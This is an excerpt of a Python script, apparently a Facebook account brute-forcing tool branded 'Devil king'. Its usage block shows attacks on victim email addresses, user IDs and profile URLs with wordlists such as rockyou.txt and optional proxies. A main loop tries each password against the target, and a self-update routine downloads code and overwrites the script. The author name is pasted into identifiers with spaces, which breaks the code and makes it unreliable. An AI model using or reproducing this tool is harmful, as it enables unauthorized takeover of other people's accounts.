...
==================================\n"""+wi)
    ...
    def updateDevil king ():
        ...
        conn.request("GET", "/Oseid/Devil king /master/core/version.txt")
        ...
        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
                ...
                conn.request("GET", "/Oseid/Devil king /master/Devil king .py")
                newCode = conn.getresponse().read().strip().decode()
                with open("Devil king .py", "w") as  Devil king Script:
                   Devil king Script.write(newCode)
                with open(versionPath, "w") as ver:
                     ver.write(repoVersion)
                write("  [+] Successfully updated :)\n")

parse = optparse.OptionParser(wi+"""
Usage: python ./Devil king .py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    ...
    |--------
    | -u/--update                             ::> Update Devil king  Script
-------------
Examples:
        |
     |--------
     | python Devil king .py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python Devil king .py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python Devil king .py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python Devil king .py -t Victim@gmail.com -s 1234567
     |--------
     | python Devil king .py -g https://www.facebook.com/Victim_Profile
     |--------
""")
...
def Main():
   ...
   if any(opt for opt in opts):
     if not Devil king .cnet():
       errMsg("Please Check Your Internet Connection")
       sys.exit(1)
   if update:
    Devil king .updateDevil king ()
    sys.exit(1)
   elif target_profile:
        Devil king .get_profile_id(target_profile)
        sys.exit(1)
        ...
        if proxy:
             ...
             if Devil king .check_proxy(final_proxy):
                Devil king .useProxy = final_proxy
                Devil king .br.set_proxies({'https':Devil king .useProxy, 'http':Devil king .useProxy})
        ...
        Devil king .banner(target,wordlist,single_passwd)
        ...
        for passwd in passwords:
                ...
                retCode = Devil king .login(target, passwd)
                if retCode:
...
#####################                #########################
##############################################################
#This Tool by a famous hacker devil king
#Have a nice day :)
#GoodBye
